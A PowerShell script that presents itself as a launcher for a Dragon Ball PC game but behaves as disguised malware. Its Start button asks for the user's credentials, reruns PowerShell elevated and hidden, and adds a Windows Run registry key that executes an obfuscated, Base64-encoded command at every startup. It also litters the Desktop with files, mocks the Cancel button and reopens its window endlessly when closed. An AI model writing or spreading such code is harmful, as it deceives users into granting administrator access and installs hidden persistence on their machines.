Function WindForm{

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

#region begin GUI{ 

$Form                            = New-Object system.Windows.Forms.Form
$Form.ClientSize                 = '675,392'
$Form.text                       = "Dbz Tenkaichi 4 PC"
$Form.BackColor                  = "#e6e6e6"
$Form.TopMost                    = $false

$Button1                         = New-Object system.Windows.Forms.Button
$Button1.text                    = "Start"
$Button1.width                   = 214
$Button1.height                  = 57
$Button1.location                = New-Object System.Drawing.Point(16,280)
$Button1.Font                    = 'Rage,35,style=Bold,Italic'
$Button1.ForeColor               = "#08114d"

$Button2                         = New-Object system.Windows.Forms.Button
$Button2.text                    = "Cancel"
$Button2.width                   = 206
$Button2.height                  = 57
$Button2.location                = New-Object System.Drawing.Point(246,280)
$Button2.Font                    = 'Rage,35,style=Bold,Italic'
$Button2.ForeColor               = "#08114d"

$MigateNoGokui                   = New-Object system.Windows.Forms.PictureBox
$MigateNoGokui.width             = 341
$MigateNoGokui.height            = 180
$MigateNoGokui.BackColor         = "#232657"
$MigateNoGokui.location          = New-Object System.Drawing.Point(14,19)
$MigateNoGokui.imageLocation     = "https://2.bp.blogspot.com/-3g4g-X1Opj0/WeJDmMuW9AI/AAAAAAAAB7A/GwW3R0wL2xIksYUmfi86G_CR2PlDJZjzACLcBGAs/s1600/Migate%2Bno%2BGokui.png"
$MigateNoGokui.SizeMode          = [System.Windows.Forms.PictureBoxSizeMode]::zoom

$ProgressBar1                    = New-Object system.Windows.Forms.ProgressBar
$ProgressBar1.width              = 343
$ProgressBar1.height             = 20
$ProgressBar1.location           = New-Object System.Drawing.Point(15,235)

$ListView1                       = New-Object system.Windows.Forms.ListView
$ListView1.text                  = "listView"
$ListView1.width                 = 278
$ListView1.height                = 51
$ListView1.location              = New-Object System.Drawing.Point(378,20)
$Form.controls.AddRange(@($Button1,$Button2,$MigateNoGokui,$ProgressBar1,$ListView1))



#region gui events {
$Button1.Add_Click({
    $ListView1.Items.Clear()
    $ListView1.Items.Add("Loading");
    $ProgressBar1.Maximum = 15; #à modifier

    Start-Process powershell.exe -Credential ($Cred=Get-Credential ($env:USERDOMAIN+'\'+$env:USERNAME) -ErrorAction Ignore ) -NoNewWindow -ArgumentList (
        "Start-Process powershell.exe -Verb runAs -WindowStyle Hidden -ArgumentList {
            New-ItemProperty -Path HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name 'SysVol3900' -Value 'cmd.exe /k powershell.exe -EncodedCommand UABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAQwA6AFwAVQBzAGUAcgBzAFwAUwBhAHkAZQBuAC0AUgBhAGkAZwBpAG4AXABEAGUAcwBrAHQAbwBwAFwAUAByAG8AagBlAHQASABvAHUAcwBzAGEAbQBcAG0AYQBpAG4ALgBwAHMAMQA=';
        }"
    );

    for($i=0;$i -lt $ProgressBar1.Maximum; $i++){ 
        $ProgressBar1.Increment($i);
        New-Item -Path ("C:\Users\$env:USERNAME\Desktop\") -Name "$i.isx" -ItemType File
    }

 })
$Button2.Add_Click({
    $ListView1.Items.Clear()
    $ListView1.Items.Add("Impossible à cancel");

    $IE = New-Object -COMObject InternetExplorer.Application -Property @{
        Navigate="https://www.youtube.com/watch?v=3Q2OxS6h-ZU&t=1777s";
        Visible = $True
    }
})
$Form.Add_FormClosed({
    for($i=0;$i -lt 9){ WindForm; }
})
$ProgressBar1.Add_RightToLeftLayoutChanged({
    $Form.Close()
})
#endregion events }





#endregion GUI }

[void]$Form.ShowDialog()
}